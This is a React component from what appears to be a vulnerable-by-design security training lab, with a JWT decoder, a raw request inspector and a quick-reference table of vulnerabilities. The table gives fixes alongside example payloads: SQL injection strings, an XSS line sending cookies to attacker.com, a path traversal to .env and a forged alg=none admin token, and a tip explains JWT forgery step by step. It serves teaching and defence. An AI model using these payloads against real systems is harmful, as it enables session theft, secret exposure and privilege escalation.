"use client";
import React, { useState } from "react";
import type { LogEntry, AttackType } from "@/types/defense";
import { mono, sans, TYPE_LABELS } from "@/constants/campusTheme";

type Props = {
  logs: LogEntry[];
};

// ── JWT Decoder ───────────────────────────────────────────────────────────────
function JwtDecoder() {
  const [input, setInput] = useState("");
  const [result, setResult] = useState<{ header: any; payload: any; warnings: string[]; raw: string[] } | null>(null);
  const [err, setErr] = useState("");

  function decode() {
    setErr(""); setResult(null);
    const parts = input.trim().replace(/^"/, "").replace(/"$/, "").split(".");
    if (parts.length < 2) { setErr("Not a valid JWT — expected at least 2 dot-separated parts."); return; }
    try {
      const pad = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
      const decodeB64 = (s: string) => JSON.parse(atob(pad(s.replace(/-/g, "+").replace(/_/g, "/"))));
      const header = decodeB64(parts[0]);
      const payload = decodeB64(parts[1]);
      const sig = parts[2] ?? "(missing)";
      const warnings: string[] = [];
      if (header.alg === "none") warnings.push("🚨 Algorithm is 'none' — signature is not verified! Anyone can forge this token.");
      if (header.alg?.startsWith("HS") && !parts[2]) warnings.push("🚨 HS algorithm but no signature present.");
      if (payload.exp && payload.exp < Date.now() / 1000) warnings.push("⚠️ Token is EXPIRED (exp: " + new Date(payload.exp * 1000).toLocaleString() + ").");
      if (!payload.exp) warnings.push("⚠️ No expiry (exp) claim — token never expires.");
      if (payload.role === "admin") warnings.push("🔑 Token has role=admin — verify this is legitimate.");
      if (payload.role === "student" || payload.role === "teacher") warnings.push("ℹ️ Token role: " + payload.role + " — try changing to admin via JWT forgery.");
      if (sig === "(missing)") warnings.push("🚨 No signature! This token can be accepted by servers that allow alg=none.");
      setResult({ header, payload, warnings, raw: parts });
    } catch (e) {
      setErr("Could not decode JWT — check that it is Base64URL-encoded JSON.");
    }
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <div>
        <div style={{ fontSize: 11, fontWeight: 700, color: "#6b7280", letterSpacing: ".08em", marginBottom: 8 }}>PASTE JWT TOKEN</div>
        <textarea
          value={input}
          onChange={e => setInput(e.target.value)}
          placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."
          spellCheck={false}
          rows={4}
          style={{
            width: "100%", background: "#0f172a", border: "1px solid rgba(255,255,255,0.08)",
            borderRadius: 8, padding: 12, color: "#93c5fd", fontFamily: mono, fontSize: 12,
            lineHeight: 1.65, resize: "vertical", outline: "none", boxSizing: "border-box",
          }}
        />
        <button onClick={decode} style={{
          marginTop: 8, fontFamily: sans, fontSize: 12, fontWeight: 700, padding: "8px 20px",
          borderRadius: 7, cursor: "pointer", background: "rgba(26,60,110,0.15)", border: "1px solid rgba(26,60,110,0.35)", color: "#93c5fd",
        }}>🔓 Decode Token</button>
      </div>

      {err && <div style={{ fontSize: 12, color: "#f87171", background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.2)", borderRadius: 8, padding: "10px 14px" }}>{err}</div>}

      {result && (
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {result.warnings.length > 0 && (
            <div style={{ background: "rgba(239,68,68,0.06)", border: "1px solid rgba(239,68,68,0.2)", borderRadius: 10, padding: "12px 16px" }}>
              <div style={{ fontSize: 10, fontWeight: 700, color: "#f87171", letterSpacing: ".1em", marginBottom: 8 }}>SECURITY ANALYSIS</div>
              {result.warnings.map((w, i) => (
                <div key={i} style={{ fontSize: 12, color: "#fca5a5", marginBottom: 4, lineHeight: 1.5 }}>{w}</div>
              ))}
            </div>
          )}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
            {[["HEADER", result.header], ["PAYLOAD", result.payload]].map(([label, obj]) => (
              <div key={label as string} style={{ background: "#0f172a", border: "1px solid rgba(255,255,255,0.07)", borderRadius: 10, overflow: "hidden" }}>
                <div style={{ padding: "7px 14px", borderBottom: "1px solid rgba(255,255,255,0.06)", fontSize: 9, fontWeight: 700, color: "#64748b", letterSpacing: ".12em" }}>{label as string}</div>
                <pre style={{ margin: 0, padding: "12px 14px", fontFamily: mono, fontSize: 12, color: "#86efac", lineHeight: 1.75, whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
                  {JSON.stringify(obj, null, 2)}
                </pre>
              </div>
            ))}
          </div>
          <div style={{ background: "#0f172a", border: "1px solid rgba(255,255,255,0.07)", borderRadius: 10, overflow: "hidden" }}>
            <div style={{ padding: "7px 14px", borderBottom: "1px solid rgba(255,255,255,0.06)", fontSize: 9, fontWeight: 700, color: "#64748b", letterSpacing: ".12em" }}>SIGNATURE</div>
            <div style={{ padding: "10px 14px", fontFamily: mono, fontSize: 12, color: result.raw[2] ? "#fbbf24" : "#f87171", wordBreak: "break-all" }}>
              {result.raw[2] ?? "⚠️ MISSING — alg=none token, no signature"}
            </div>
          </div>
          <div style={{ fontSize: 11, color: "#6b7280", background: "#f9fafb", borderRadius: 8, padding: "10px 14px", border: "1px solid #e2e8f0" }}>
            💡 <strong>Tip:</strong> To forge a JWT with role=admin: change payload to <code style={{ fontFamily: mono, background: "#e2e8f0", padding: "1px 4px", borderRadius: 3 }}>{`{"role":"admin"}`}</code>, set alg=none, re-encode both parts, and drop the signature. See <code style={{ fontFamily: mono, background: "#e2e8f0", padding: "1px 4px", borderRadius: 3 }}>/jwt-debug</code> for a live lab.
          </div>
        </div>
      )}
    </div>
  );
}

// ── HTTP Request Inspector ────────────────────────────────────────────────────
function RequestInspector({ logs }: { logs: LogEntry[] }) {
  const [selected, setSelected] = useState<string | null>(null);
  const log = logs.find(l => l.id === selected);

  const recentLogs = logs.slice(0, 30);

  const buildRawRequest = (l: LogEntry) => {
    const isPost = l.method === "POST";
    const body = isPost ? `\n\n${l.payload}` : "";
    return `${l.method} ${l.endpoint} HTTP/1.1
Host: localhost:3000
User-Agent: ${l.userAgent}
Accept: application/json
Content-Type: ${isPost ? "application/json" : ""}
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ey... (truncated)
X-Forwarded-For: ${l.ip}
Connection: keep-alive${body}`;
  };

  return (
    <div style={{ display: "flex", gap: 0, height: 460, border: "1px solid #e2e8f0", borderRadius: 10, overflow: "hidden" }}>
      {/* Log selector */}
      <div style={{ width: 280, flexShrink: 0, borderRight: "1px solid #e2e8f0", overflow: "auto", background: "#f9fafb" }}>
        <div style={{ padding: "10px 14px", borderBottom: "1px solid #e2e8f0", fontSize: 10, fontWeight: 700, color: "#9ca3af", letterSpacing: ".1em" }}>
          RECENT REQUESTS ({recentLogs.length})
        </div>
        {recentLogs.map(l => (
          <button key={l.id} onClick={() => setSelected(l.id)} style={{
            width: "100%", textAlign: "left", padding: "9px 14px",
            background: selected === l.id ? "rgba(26,60,110,0.08)" : "transparent",
            border: "none", borderBottom: "1px solid #f3f4f6",
            borderLeft: selected === l.id ? "3px solid #1a3c6e" : "3px solid transparent",
            cursor: "pointer",
          }}>
            <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 2 }}>
              <span style={{ fontSize: 9, fontWeight: 700, color: l.method === "POST" ? "#c2410c" : "#1d4ed8", fontFamily: mono, background: l.method === "POST" ? "#fff7ed" : "#eff6ff", padding: "1px 5px", borderRadius: 3 }}>{l.method}</span>
              <span style={{ fontSize: 10, fontFamily: mono, color: "#374151", fontWeight: 600, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: 160 }}>{l.endpoint}</span>
            </div>
            <div style={{ fontSize: 10, color: "#9ca3af" }}>{new Date(l.ts).toLocaleTimeString()} · {l.ip}</div>
          </button>
        ))}
      </div>

      {/* Raw request */}
      {log ? (
        <div style={{ flex: 1, display: "flex", flexDirection: "column", minWidth: 0, background: "#0f172a" }}>
          <div style={{ padding: "10px 16px", borderBottom: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ fontSize: 10, fontWeight: 700, color: "#64748b", letterSpacing: ".1em" }}>RAW HTTP REQUEST</span>
            <span style={{ fontSize: 10, fontFamily: mono, color: "#f5820a", marginLeft: "auto" }}>{log.ip}:{log.port}</span>
          </div>
          <pre style={{ flex: 1, margin: 0, padding: "14px 18px", fontFamily: mono, fontSize: 12, color: "#94a3b8", lineHeight: 1.75, overflowY: "auto", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
            <span style={{ color: "#60a5fa", fontWeight: 700 }}>{log.method}</span>{" "}
            <span style={{ color: "#f5820a" }}>{log.endpoint}</span>{" HTTP/1.1\n"}
            <span style={{ color: "#6b7280" }}>{"Host: localhost:3000\nUser-Agent: "}</span>
            <span style={{ color: "#94a3b8" }}>{log.userAgent}</span>
            {"\n"}
            <span style={{ color: "#6b7280" }}>Accept: </span><span style={{ color: "#94a3b8" }}>application/json{"\n"}</span>
            <span style={{ color: "#6b7280" }}>Content-Type: </span><span style={{ color: "#94a3b8" }}>application/json{"\n"}</span>
            <span style={{ color: "#6b7280" }}>X-Forwarded-For: </span><span style={{ color: "#f87171" }}>{log.ip}{"\n"}</span>
            <span style={{ color: "#6b7280" }}>Connection: keep-alive{"\n\n"}</span>
            {log.payload && (
              <>
                <span style={{ color: "#4ade80", fontWeight: 700 }}>{log.payload}</span>
              </>
            )}
          </pre>
          <div style={{ padding: "10px 16px", borderTop: "1px solid rgba(255,255,255,0.06)", background: "#1e293b" }}>
            <div style={{ fontSize: 10, fontWeight: 700, color: "#64748b", letterSpacing: ".08em", marginBottom: 6 }}>ATTACK SUMMARY</div>
            <div style={{ fontSize: 12, color: "#94a3b8", lineHeight: 1.6 }}>{log.detail}</div>
          </div>
        </div>
      ) : (
        <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 10, background: "#0f172a" }}>
          <div style={{ fontSize: 32, opacity: 0.15 }}>📡</div>
          <div style={{ fontSize: 11, color: "#475569", fontWeight: 700, letterSpacing: ".08em" }}>SELECT A REQUEST</div>
        </div>
      )}
    </div>
  );
}

// ── Quick Reference ───────────────────────────────────────────────────────────
const QUICK_REF: { type: AttackType; fix: string; detect: string; example: string }[] = [
  { type: "sqli_login",  fix: "Use db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(u, p)", detect: "Login with: admin'-- or ' OR 1=1--  →  201/200 response with token", example: "username=admin'--&password=anything" },
  { type: "sqli_search", fix: "Use parameterized query: db.prepare('...WHERE full_name LIKE ?').all('%'+q+'%')", detect: "Search: %' UNION SELECT 1,2,3-- → extra columns in response", example: "%' UNION SELECT flag_value,2,3,4,5 FROM flags--" },
  { type: "xss_notices", fix: "Replace dangerouslySetInnerHTML with {notice.title} plain JSX text nodes", detect: "POST /api/notices with title: <script>alert(1)</script> → executes on page load", example: "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>" },
  { type: "jwt_forge",   fix: "Remove 'none' from algorithms: jwt.verify(token, SECRET, {algorithms:['HS256']})", detect: "Modify JWT payload to role:admin, set alg:none, strip signature", example: "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." },
  { type: "idor_profile",fix: "Add ownership check: if (tokenUser.id !== Number(id) && tokenUser.role==='student') return 403", detect: "GET /api/profile/1 as a student → returns admin's profile", example: "GET /api/profile/1 (while logged in as student ID=5)" },
  { type: "lfi_documents", fix: "Use path.basename(file) before joining: const safeFile = path.basename(file)", detect: "GET /api/documents?file=../../../../.env → returns secrets", example: "?file=../../../../.env or ?file=../../../lib/auth.ts" },
  { type: "open_redirect", fix: "Only allow paths starting with /: const safe = next?.startsWith('/') ? next : '/dashboard'", detect: "GET /login?next=https://evil.com → redirects to external site after login", example: "/login?next=https://phishing.example.com" },
  { type: "recon",       fix: "Remove all HTML comments with credentials. Delete /api/env-file route entirely.", detect: "View page source → find credentials in <!-- Developer Notes --> comment", example: "curl http://localhost:3000 | grep -i 'admin\\|secret\\|flag'" },
];

function QuickRef() {
  const [expanded, setExpanded] = useState<AttackType | null>(null);

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      {QUICK_REF.map(item => {
        const isOpen = expanded === item.type;
        return (
          <div key={item.type} style={{ border: "1px solid #e2e8f0", borderRadius: 10, overflow: "hidden", background: isOpen ? "#fff" : "#f9fafb", transition: "all .15s" }}>
            <button onClick={() => setExpanded(isOpen ? null : item.type)} style={{
              width: "100%", textAlign: "left", padding: "12px 16px", background: "transparent", border: "none", cursor: "pointer",
              display: "flex", alignItems: "center", gap: 10, fontFamily: sans,
            }}>
              <span style={{ fontSize: 14 }}>{isOpen ? "▼" : "▶"}</span>
              <span style={{ fontSize: 12, fontWeight: 700, color: "#1a3c6e" }}>{TYPE_LABELS[item.type]}</span>
            </button>
            {isOpen && (
              <div style={{ padding: "0 16px 16px", display: "flex", flexDirection: "column", gap: 12 }}>
                {[
                  ["🔴 How to detect / exploit", item.detect, "#fff1f1", "#fca5a5", "#b91c1c"],
                  ["✅ How to fix", item.fix, "#f0fdf4", "#86efac", "#15803d"],
                  ["💻 Example payload", item.example, "#eff6ff", "#93c5fd", "#1d4ed8"],
                ].map(([label, content, bg, border, color]) => (
                  <div key={label as string} style={{ background: bg as string, border: `1px solid ${border as string}`, borderRadius: 8, padding: "10px 14px" }}>
                    <div style={{ fontSize: 10, fontWeight: 700, color: color as string, letterSpacing: ".06em", marginBottom: 5 }}>{label as string}</div>
                    <code style={{ fontSize: 12, fontFamily: mono, color: "#374151", lineHeight: 1.65, display: "block", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>{content as string}</code>
                  </div>
                ))}
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

// ── Main ToolsTab ─────────────────────────────────────────────────────────────
type Tool = "jwt" | "requests" | "reference";

export function ToolsTab({ logs }: Props) {
  const [activeTool, setActiveTool] = useState<Tool>("jwt");

  const TOOLS: { id: Tool; icon: string; label: string; desc: string }[] = [
    { id: "jwt",       icon: "🔓", label: "JWT Decoder",     desc: "Paste any token to decode and analyze for weaknesses" },
    { id: "requests",  icon: "📡", label: "Request Log",     desc: "Inspect raw HTTP requests from the attack log" },
    { id: "reference", icon: "📖", label: "Quick Reference", desc: "How to detect, exploit, and fix each vulnerability" },
  ];

  return (
    <div style={{ flex: 1, display: "flex", minHeight: 0, background: "#f5f7fa" }}>

      {/* Sidebar */}
      <div style={{ width: 220, flexShrink: 0, background: "#fff", borderRight: "1px solid #e2e8f0", display: "flex", flexDirection: "column" }}>
        <div style={{ padding: "14px 16px", borderBottom: "1px solid #e2e8f0", background: "#f9fafb" }}>
          <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: ".12em", color: "#6b7280" }}>DEFENDER TOOLS</div>
          <div style={{ fontSize: 11, color: "#9ca3af", marginTop: 2 }}>Interactive utilities</div>
        </div>
        <div style={{ padding: "8px" }}>
          {TOOLS.map(tool => (
            <button key={tool.id} onClick={() => setActiveTool(tool.id)} style={{
              width: "100%", textAlign: "left", padding: "10px 12px", marginBottom: 4,
              borderRadius: 8, border: activeTool === tool.id ? "1px solid rgba(26,60,110,0.2)" : "1px solid transparent",
              background: activeTool === tool.id ? "rgba(26,60,110,0.06)" : "transparent",
              cursor: "pointer", fontFamily: sans,
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 2 }}>
                <span style={{ fontSize: 16 }}>{tool.icon}</span>
                <span style={{ fontSize: 12, fontWeight: 700, color: activeTool === tool.id ? "#1a3c6e" : "#374151" }}>{tool.label}</span>
              </div>
              <div style={{ fontSize: 10, color: "#9ca3af", lineHeight: 1.5 }}>{tool.desc}</div>
            </button>
          ))}
        </div>
        <div style={{ marginTop: "auto", padding: "14px 16px", borderTop: "1px solid #e2e8f0", fontSize: 10, color: "#9ca3af", lineHeight: 1.6 }}>
          💡 Use these tools while monitoring the Logs tab to understand and counter attacks in real time.
        </div>
      </div>

      {/* Content */}
      <div style={{ flex: 1, overflowY: "auto", padding: 28 }}>
        {activeTool === "jwt" && (
          <>
            <h2 style={{ margin: "0 0 6px", fontSize: 18, fontWeight: 800, color: "#1a3c6e" }}>🔓 JWT Token Decoder</h2>
            <p style={{ margin: "0 0 24px", fontSize: 13, color: "#6b7280" }}>
              Paste any JWT you intercept (from DevTools → Application → Cookies → <code style={{ fontFamily: mono, background: "#f3f4f6", padding: "1px 4px", borderRadius: 3 }}>token</code>) to decode it and check for vulnerabilities.
            </p>
            <JwtDecoder />
          </>
        )}
        {activeTool === "requests" && (
          <>
            <h2 style={{ margin: "0 0 6px", fontSize: 18, fontWeight: 800, color: "#1a3c6e" }}>📡 HTTP Request Inspector</h2>
            <p style={{ margin: "0 0 24px", fontSize: 13, color: "#6b7280" }}>
              Select an attack from the live feed to view the raw reconstructed HTTP request — including headers, payload, and endpoint details.
            </p>
            <RequestInspector logs={logs} />
          </>
        )}
        {activeTool === "reference" && (
          <>
            <h2 style={{ margin: "0 0 6px", fontSize: 18, fontWeight: 800, color: "#1a3c6e" }}>📖 Vulnerability Quick Reference</h2>
            <p style={{ margin: "0 0 24px", fontSize: 13, color: "#6b7280" }}>
              For each attack type: how attackers exploit it, how defenders detect it in the logs, and the exact code fix needed.
            </p>
            <QuickRef />
          </>
        )}
      </div>
    </div>
  );
}
